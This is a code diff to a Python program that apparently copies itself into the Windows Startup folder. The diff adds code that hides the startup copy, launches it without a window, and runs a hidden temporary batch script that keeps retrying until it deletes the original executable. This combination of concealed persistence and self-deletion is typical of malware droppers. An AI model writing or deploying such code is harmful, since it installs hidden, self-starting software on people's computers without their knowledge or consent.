@@ -56,6 +56,38 @@ def _hide_path(path):
         pass
 
 
+def _schedule_delete(path_to_delete):
+    if not path_to_delete or not os.path.exists(path_to_delete):
+        return False
+
+    batch_lines = [
+        "@echo off",
+        "setlocal",
+        "set \"target=%~1\"",
+        ":retry",
+        "del /f /q \"%target%\" 2>nul",
+        "if exist \"%target%\" (",
+        "  timeout /t 1 /nobreak >nul",
+        "  goto :retry",
+        ")",
+        "exit /b 0",
+    ]
+    tmp_dir = tempfile.gettempdir()
+    batch_path = os.path.join(tmp_dir, f"telelluc_delete_{int(time.time())}.bat")
+    try:
+        with open(batch_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(batch_lines) + "\n")
+        subprocess.Popen(
+            ["cmd", "/c", batch_path, path_to_delete],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+        )
+        return True
+    except Exception:
+        return False
+
+
 def ensure_startup():
     startup_dir = os.path.join(
         os.environ.get("APPDATA", ""),
@@ -84,6 +116,7 @@ def ensure_startup():
                 try:
                     if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
                         try:
+                            _hide_path(startup_exe)
                             subprocess.Popen(
                                 [startup_exe],
                                 creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
@@ -93,15 +126,7 @@ def ensure_startup():
                         except OSError:
                             pass
 
-                        for _ in range(10):
-                            try:
-                                os.remove(source_exe)
-                                break
-                            except PermissionError:
-                                time.sleep(0.2)
-                            except OSError:
-                                break
-
+                        _schedule_delete(source_exe)
                         os._exit(0)
                 except OSError:
                     pass
